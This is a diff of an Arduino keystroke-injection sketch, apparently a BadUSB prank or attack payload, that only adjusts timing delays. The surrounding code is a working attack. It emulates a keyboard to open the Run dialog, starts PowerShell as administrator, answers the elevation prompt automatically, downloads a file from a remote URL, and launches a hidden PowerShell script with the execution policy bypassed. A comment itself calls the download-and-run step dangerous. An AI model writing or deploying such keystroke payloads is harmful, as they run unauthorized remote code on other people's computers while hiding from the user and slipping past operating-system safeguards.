@@ -19,13 +19,12 @@ void setup() {
   String download_ride = "$ride = '" + ride +"'; $ride_file = 'ride.wav'; $down.DownloadFile($ride,$ride_file);";
   String start_process = "Start-Process -FilePath 'powershell.exe' -WindowStyle hidden -ArgumentList '-executionPolicy bypass -noexit -file \"C:\\WINDOWS\\system32\\trap.ps1\"'";
   
-  delay(100);
   // WIN+R to open Run
   Keyboard.press(KEY_LEFT_WINDOWS);
   // Keyboard.press(114);
   Keyboard.press(KEY_R);
   Keyboard.releaseAll();
-  delay(350);
+  delay(360);
 
   // Start PowerShell as admin
   Keyboard.print("powershell Start-Process powershell -Verb runAs");
@@ -42,7 +41,7 @@ void setup() {
   // Keyboard.press(121);
   Keyboard.press(KEY_Y);
   Keyboard.releaseAll();
-  delay(750);
+  delay(1000);
 
   // Run PowerShell command: save file at $url as $file and execute it
   // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
